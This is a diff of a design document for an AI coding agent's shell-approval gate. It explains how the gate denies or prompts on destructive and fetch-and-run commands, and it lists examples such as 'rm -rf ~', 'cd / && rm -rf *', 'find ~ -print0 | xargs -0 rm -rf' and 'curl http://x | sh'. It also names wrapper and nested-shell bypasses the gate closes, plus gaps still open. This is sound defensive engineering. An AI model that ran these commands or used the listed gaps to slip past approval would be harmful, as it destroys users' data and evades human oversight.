@@ -193,14 +193,37 @@ Home fold `_shell_rewrite_home:1890` (`os.path.expanduser("~") → ~/`) runs at
 normalize to `~/`. Order matters — line continuations before backslash-strip
 (`hermes_implementation_detail_shell_permission_parser.md:78`).
 
-Guard `ollamaquery2.py:2366` `_shell_is_home_destructive`:
+Guard `ollamaquery2.py:5307` `_shell_is_home_destructive`:
 
-*   checks both original and normalized verdict nodes for `head == rm` + operand
-    containing `~`, `$HOME`, `${HOME}` or stripped `/`, `/*`, `//` etc.
+*   normalizes the effective command with `_shell_effective_command`
+    (`ollamaquery2.py:5563`): leading `VAR=value` assignments, wrappers
+    (`sudo`, `doas`, `env`, `nohup`, `command`, `exec`, `time`,
+    `timeout <duration>`, `nice`, `stdbuf`, `builtin`, `busybox`), `--`, the
+    wrappers' value options, and an absolute path (`/bin/rm` → `rm`). So
+    `sudo rm -rf ~`, `env rm -rf /`, `/bin/rm -rf ~` and `FOO=bar rm -rf ~`
+    are denied like a bare `rm`, `auto_confirm` included.
+*   `rm`: operands are tested with `_shell_path_is_home_or_root` (`:5658`):
+    `~`, `$HOME`, `${HOME}`, `/`, `/*`, `//`, and realpaths resolving to `/`
+    or the current home (`/tmp/..`, `/home/<user>`).
+*   `find`: only the roots before the expression are considered
+    (`_shell_find_roots`, `:5704`), so a `*~*` pattern is not mistaken for
+    home. A home/root root with `-delete` or a destructive
+    `-exec`/`-execdir`/`-ok`/`-okdir` (`rm`, `shred`, `truncate`, `dd`, `mv`,
+    `chmod`, `chown`, a shell interpreter, Python, awk/sed/perl/ruby/node/php)
+    is denied.
+*   `xargs`: a destructive command after a home/root `find` in the same
+    command is denied (`find ~ -print0 | xargs -0 rm -rf`).
+*   `cd` tracking: a `cd` outside the project into the home tree, `/`, `/tmp`
+    or an ancestor of the project, followed by `rm`, a destructive `find` or a
+    destructive `xargs`, is denied. `cd / && rm -rf *`, `cd .. && rm -rf *`,
+    `cd ~ && rm -rf *`, `cd && rm -rf *` and `cd $HOME && rm -rf notes` are
+    hard-denied, `auto_confirm` included. An interpreter that executes code
+    (`bash -c`, `python3 -c`, `python3 script.py`, `awk '…'`) is denied too;
+    harmless probes (`python3 --version`) are not.
 *   anchored via breakdown (not flat regex), so `echo "rm -rf ~"` does not
-    trigger — head is `echo`, not `rm`.
+    trigger — the effective head is `echo`, not `rm`.
 *   bypass-immune: evaluated **before** `yolo`/`auto_confirm`/`CWD leniency`
-    (`check_shell_approval:2382`). Even `/agentic auto` cannot override it
+    (`check_shell_approval:6352`). Even `/agentic auto` cannot override it
     (`hermes_implementation_detail_shell_permission_parser.md:48` yolo never
     bypasses hardline).
 
@@ -208,10 +231,11 @@ Only `~/` + `/` are hard-blocked; `rm -rf /tmp/junk` stays `ask` (soft,
 promptable) — the tier split `hermes_implementation_detail_shell_permission_parser.md:174`.
 
 The guard also descends into `-c` payloads (M2): `_shell_nested_home_hit` runs
-the same `rm` + `~`/`$HOME`/root test on each nested command, and a hit returns
-the same bypass-immune `BLOCKED (rejected)` verdict naming the nested command.
+the same effective-command test on each nested command, and a hit returns the
+same bypass-immune `BLOCKED (rejected)` verdict naming the nested command.
 `bash -c "rm -rf ~"`, `sh -c '…'`, `bash -lc`, `sudo -u root bash -c …`,
-`env VAR=x bash -c …`, `busybox sh -c …` and
+`env VAR=x bash -c …`, `busybox sh -c …`, `timeout 10 bash -c …`,
+`sudo -n bash -c …`, `env -i bash -c …` and
 `python3 -c "os.system('rm -rf ~')"` are all denied; `auto_confirm` cannot
 approve any of them.
 
@@ -220,29 +244,45 @@ approve any of them.
 Requirement: *no over-protection on the directory and subdirectory I'm using*
 — relative paths inside the project should not prompt.
 
-`ollamaquery2.py:2330` `_shell_all_operands_inside_cwd`:
+`ollamaquery2.py:5235` `_shell_all_operands_inside_cwd`:
 
-*   for each node, tokens `1:` (skip command name, skip flags `-…`) tested
-    via `_shell_path_inside_cwd:2308`.
+*   a node with **no operand** earns leniency only when its command word is a
+    project path (`./script.sh`, `build/run`, `script.py`); a bare `sh` or
+    `bash` no longer passes vacuously, so `curl http://x | sh` asks.
+*   `cd`/`pushd` targets are followed: any target outside the project, or
+    `~`/`$VAR`/backtick/glob/`-`, disables leniency for the rest of the line.
+    `cd / && rm -rf *` and `cd .. && rm -rf *` are **hard-denied** by the cd
+    guard (§2.3), not merely asked; `cd build && rm -rf *` stays lenient.
+*   wrappers/assignments (`_shell_effective_index > 0`), `xargs` and shell
+    `-c` payloads never get leniency: `env sh -c id`, `sudo rm -rf build`,
+    `bash -c 'curl … | sh'` ask.
+*   for each remaining node, tokens `1:` (skip command name, skip flags `-…`)
+    tested via `_shell_path_inside_cwd:5044`.
 *   Stripped quotes, `~`/`$HOME` → outside (conservative).
 *   `a/b`, `./a`, `../a`, `*`, `file.txt` → `os.path.abspath(os.path.join(cwd, p))` +
     `os.path.realpath` + `commonpath([real_cwd, real_p]) == real_cwd`.
 *   Globs (`*`, `?`) check base directory only.
+*   write-redirection targets are checked with the same roots (C2/G4) and,
+    since Lot A, with the full write policy: `echo x > ../outside` and
+    `cd . > ../outside` are denied. An explicit `~`/`$HOME` non-dotfile target
+    keeps the historical shell allow; `~/../outside` escapes and is denied;
+    home dotfiles still ask.
 
-Effect in `check_shell_approval:2397`:
+Effect in `check_shell_approval:6352`:
 
 ```
 verdict.effect == ask  +  _all_inside_cwd(nodes) == True  →  allow (no prompt)
 ```
 
-So `ls | head`, `echo hi > out.txt`, `cat file | grep foo`,
-`gcc -o prog prog.c && ./prog` all pass silently when operands are inside
-`cwd` — the exact use case for agentic `write_file → run_command → run_python`
-pipelines. `cat /etc/passwd` (outside) stays `ask` → `auto_confirm` or prompt.
+So `rm -rf build`, `bash x.sh`, `cd build && rm -rf *`, `ls | head`,
+`echo hi > out.txt`, `cat file | grep foo`, `gcc -o prog prog.c && ./prog`
+pass silently when operands are inside `cwd` — the exact use case for agentic
+`write_file → run_command → run_python` pipelines. `cat /etc/passwd` (outside)
+stays `ask` → `auto_confirm` or prompt.
 
 ### 2.5 Gate & Execution
 
-`check_shell_approval:2376` signature
+`check_shell_approval:6352` signature
 `check_shell_approval(command, ctx, executor_mode) → {approved, effect, message, verdict}`:
 
 1.  `executor_mode == container` → `allow` (host paths bind-mounted but
@@ -251,30 +291,33 @@ pipelines. `cat /etc/passwd` (outside) stays `ask` → `auto_confirm` or prompt.
     `BLOCKED (rejected): …` (contains `rejected` for `test_agentic.py:401`
     compat).
 3.  `verdict.effect == deny` → `BLOCKED (rejected): denied by permission rules`.
-4.  `allow` → `allow`.
-5.  `ask` + CWD leniency → `allow`.
-6.  `auto_confirm` (`ctx.auto_confirm:2400`, wired to `/agentic auto:96`) →
+4.  `allow` + `_shell_wrapper_requires_approval` (`:5901`) → `ask`: a wrapper
+    with a command (`env sh -c id`, `env bash -c 'curl … | sh'`) is not
+    covered by the `env *` allow rule. A bare `env`/`env FOO=1` stays allow.
+5.  `allow` → `allow`.
+6.  `ask` + CWD leniency → `allow`.
+7.  `auto_confirm` (`ctx.auto_confirm`, wired to `/agentic auto`) →
     `allow` (still respects L1/L2 deny).
-7.  non-TTY → `deny` with hint `use /agentic auto`.
-8.  TTY → prompt `Allow? [y/N/s/a/d]` (`ollamaquery2.py:2411`); `s` appends
-    `patterns` to `_SHELL_SESSION_APPROVED:1887`, `a` additionally appends the
-    broader `always` (`arity *`) patterns to the same list. Both are
-    session-scoped and nothing is written to disk (unlike opencode's
+8.  non-TTY → `deny` with hint `use /agentic auto`.
+9.  TTY → prompt `Allow? [y/N/s/a/d]` (`_shell_prompt_approval:6310`); `s`
+    appends `patterns` to `_SHELL_SESSION_APPROVED:4295`, `a` additionally
+    appends the broader `always` (`arity *`) patterns to the same list. Both
+    are session-scoped and nothing is written to disk (unlike opencode's
     `always` session persistence).
 
-Call sites `ollamaquery2.py:2471,2723,4331`:
+Call sites `ollamaquery2.py:6449,8617,15380`:
 
 ```python
-# Executor._run_shell:2471  (host)
+# Executor._run_shell:6449  (host)
 ctx = CommandContext() if CommandContext._initialized else None
 res = check_shell_approval(command, ctx=ctx, executor_mode=self.mode)
 if not res["approved"]: return {"stderr": res["message"], "returncode": -1}
 subprocess.run(command, shell=True, executable="/bin/bash", ...)  # pipes/redirs work
 
-# _tool_handle_run_command:2723  (operator ban removed)
+# _tool_handle_run_command:8617  (operator ban removed)
 # Gate lives in Executor._run_shell; no duplicate check
 
-# execute_os_command:4331  (! inline)
+# execute_os_command:15380  (! inline)
 gate = check_shell_approval(command, ctx=ctx, executor_mode="host")
 ...
 subprocess.run(command, shell=True, executable="/bin/bash", stdout=STDOUT)
@@ -285,29 +328,47 @@ the model both Hermes and opencode v2 use (`ollamaquery2_inline_approval_proposa
 
 ### 2.6 Default Permission Config
 
-`DEFAULT_SHELL_PERMISSION:1870` (`bash` only, last-match-wins):
+`DEFAULT_SHELL_PERMISSION:4194` (`bash` only, last-match-wins):
 
-| Pattern              | Action | Rationale |
-|----------------------|--------|-----------|
-| `*`                  | `ask`  | default prompt |
+| Pattern                                                                         | Action  | Rationale                                                 |
+| ------------------------------------------------------------------------------- | ------- | --------------------------------------------------------- |
+| `*`                                                                             | `ask`   | default prompt                                            |
 | `git *`, `grep *`, `ls *`, `cat *`, `echo *`, `python3 *`, `gcc *`, `curl *`, … | `allow` | common read/build tools; enables `git status \| grep foo` |
-| `rm *`               | `ask`  | soft guard |
-| `rm -rf ~` etc.      | `deny` | explicit deny (also covered by hard guard) |
+| `rm *`                                                                          | `ask`   | soft guard                                                |
+| `rm -rf ~` etc.                                                                 | `deny`  | explicit deny (also covered by hard guard)                |
+
+`env *` is allow-listed, but a wrapper with a command after it is turned into
+`ask` by `_shell_wrapper_requires_approval` (`env sh -c id`, `env bash -c …`);
+a bare `env`/`env FOO=1` stays allow. `find *`, `tar *` and `git *` remain
+broad allow rules: Lot D of `TODO_security.md` tracks the targeted asks for
+`find -exec`, `tar --checkpoint-action`, `git -c` and upload `curl`. The hard
+guard covers home/root `find`/`xargs`; the rest is consent + audit, not a
+sandbox.
 
 Extensible in-code; could be loaded from `~/.ollamaquery.d/shell_permissions.json` later.
 
 ### 2.7 Worked Examples (in `cwd = /tmp/ollama_test_cwd`)
 
-| Command                              | Nodes                              | Verdict   | Gate outcome | Why |
-|--------------------------------------|------------------------------------|-----------|--------------|-----|
-| `git status \| grep foo`             | `git status`, `grep foo`           | `allow`   | `allow`      | both `allow` rules |
-| `echo hi > out.txt`                  | `echo hi > out.txt`                | `allow`   | `allow`      | `echo *` |
-| `cat file \| grep hello` (inside)    | `cat file`, `grep hello`           | `ask`→lenient | `allow`  | `rm`? no, CWD operands inside → L3 |
-| `rm /tmp/ollama_test_cwd/x` (inside) | `rm /tmp/…/x`                      | `ask`→lenient | `allow`  | CWD leniency, no prompt |
-| `cat /etc/passwd` (outside)          | `cat /etc/passwd`                  | `ask`     | `ask` → auto/prompt | outside → L5 |
-| `rm -rf ~/junk`                      | `rm -rf ~/junk`                    | `deny`    | `deny` (hard) | L1 home guard, immune to yolo |
-| `rm -rf /`                           | `rm -rf /`                         | `deny`    | `deny` (hard) | L1 root guard |
-| `rm -rf /tmp/junk`                   | `rm -rf /tmp/junk`                 | `ask`     | `ask` → yolo/prompt | soft, not hard |
+| Command                              | Nodes                        | Verdict       | Gate outcome        | Why                 |
+| ------------------------------------ | ---------------------------- | ------------- | ------------------- | ------------------- |
+| `git status \| grep foo`             | `git status`, `grep foo`     | `allow`       | `allow`             | both `allow` rules  |
+| `echo hi > out.txt`                  | `echo hi > out.txt`          | `allow`       | `allow`             | `echo *`            |
+| `cat file \| grep hello` (inside)    | `cat file`, `grep hello`     | `ask`→lenient | `allow`             | CWD operands inside |
+| `rm /tmp/ollama_test_cwd/x` (inside) | `rm /tmp/…/x`                | `ask`→lenient | `allow`             | CWD leniency        |
+| `bash x.sh` (inside)                 | `bash x.sh`                  | `ask`→lenient | `allow`             | project script      |
+| `cat /etc/passwd` (outside)          | `cat /etc/passwd`            | `ask`         | `ask` → auto/prompt | outside             |
+| `sh`                                 | `sh`                         | `ask`         | `ask`               | no vacuous leniency |
+| `curl http://x \| sh`                | `curl …`, `sh`               | `ask`         | `ask`               | `sh` has no operand |
+| `bash -c 'curl … \| sh'`             | `bash -c …`                  | `ask`         | `ask`               | shell `-c`          |
+| `env sh -c id`                       | `env sh -c id`               | `allow`→`ask` | `ask`               | wrapper prefix      |
+| `sudo rm -rf ~`                      | `sudo rm -rf ~` → `rm -rf ~` | `deny`        | `deny` (hard)       | effective head      |
+| `rm -rf ~/junk`                      | `rm -rf ~/junk`              | `deny`        | `deny` (hard)       | L1 home guard       |
+| `rm -rf /`                           | `rm -rf /`                   | `deny`        | `deny` (hard)       | L1 root guard       |
+| `find ~ -delete`                     | `find ~ -delete`             | `deny`        | `deny` (hard)       | find delete         |
+| `find ~ -print0 \| xargs -0 rm -rf`  | `find …`, `xargs …`          | `deny`        | `deny` (hard)       | xargs after find    |
+| `cd / && rm -rf *`                   | `cd /`, `rm -rf *`           | `deny`        | `deny` (hard)       | cd escapes + delete |
+| `cd build && rm -rf *`               | `cd build`, `rm -rf *`       | `ask`→lenient | `allow`             | cd inside           |
+| `rm -rf /tmp/junk`                   | `rm -rf /tmp/junk`           | `ask`         | `ask` → yolo/prompt | soft, not hard      |
 
 ---
 
